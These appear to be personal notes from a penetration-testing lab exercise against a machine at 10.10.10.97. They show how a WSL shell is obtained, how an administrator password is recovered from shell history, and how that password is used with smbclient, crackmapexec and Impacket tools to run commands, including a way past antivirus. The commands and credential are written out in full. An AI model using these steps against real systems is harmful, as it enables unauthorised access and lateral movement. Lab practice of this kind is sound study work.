![[Pasted image 20250414170532.png]]
# Find the WSL binary
---
- `where /R c:\windows wsl.exe`
- ![[Pasted image 20250414164004.png]]
- `c:\Windows\System32\wsl.exe whoami`
	- ![[Pasted image 20250414164036.png]]

# Getting a shell on linux
---
- `C:\inetpub\new-site>c:\Windows\System32\bash.exe`
	- ![[Pasted image 20250414164104.png]]
- `python -c "import pty;pty.spawn('/bin/bash')"`
	- ![[Pasted image 20250414164229.png]]

# Getting shell on windows using python
---
- Checking history
	- ![[Pasted image 20250414164330.png]]
- Connect with smb shares again with administrator:
	- `smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\10.10.10.97\\c$`
	- ![[Pasted image 20250414164532.png]]
# Impacket crackmapexe / psexec
---
- `crackmapexec smb 10.10.10.97 -u administrator -p 'u6!4ZwgwOM#^OBf#Nwnh' -X whoami`
	![[Pasted image 20250414165409.png]]
	![[Pasted image 20250414165526.png]]

# If Antivirus Blocks
---
- ==We can use `wmiexec`or `smbexec`:==
	- ![[Pasted image 20250414165623.png]]